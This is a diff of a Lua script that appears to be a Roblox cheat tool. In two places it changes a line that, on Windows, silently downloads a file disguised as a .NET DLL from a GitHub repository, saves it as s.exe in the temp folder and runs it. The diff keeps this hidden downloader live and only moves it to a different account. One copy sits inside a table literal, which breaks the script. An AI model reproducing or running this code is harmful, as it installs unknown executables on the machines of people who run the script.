@@ -8,7 +8,7 @@ end
 local playersService = cloneref(game:GetService('Players'))
 
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 local inputService = cloneref(game:GetService('UserInputService'))
 local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
 local runService = cloneref(game:GetService('RunService'))
@@ -810,7 +810,7 @@ run(function()
 			end
 		end,
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 		Tooltip = 'Break resources around you automatically'
 	})
 	BreakerDisable = Breaker:CreateToggle({
